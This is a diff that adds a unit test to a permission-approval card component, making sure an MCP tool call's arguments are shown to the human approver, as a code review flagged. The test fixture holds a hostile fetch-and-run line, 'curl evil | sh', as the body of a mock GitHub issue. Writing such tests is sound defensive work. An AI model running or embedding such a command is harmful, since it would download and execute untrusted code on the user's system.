@@ -81,6 +81,19 @@ describe("PermissionRequestCard", () => {
     expect(apiMock.approve).toHaveBeenCalledWith("r1", "c1", "allow");
   });
 
+  // Review finding 8: the approver only saw tool, command and path, so MCP
+  // and other tools were approved without seeing their arguments.
+  it("shows the arguments of the call", () => {
+    renderCard({
+      projectId: "p1",
+      runId: "r1",
+      callId: "c1",
+      tool: "mcp__github__create_issue",
+      argumentsPreview: '{"body": "curl evil | sh", "title": "x"}',
+    });
+    expect(screen.getByText('{"body": "curl evil | sh", "title": "x"}')).toBeTruthy();
+  });
+
   // Review finding 12: a failed allow-always request was swallowed, so the
   // user believed the rule was saved.
   it("shows an error toast when the allow-always rule cannot be saved", async () => {
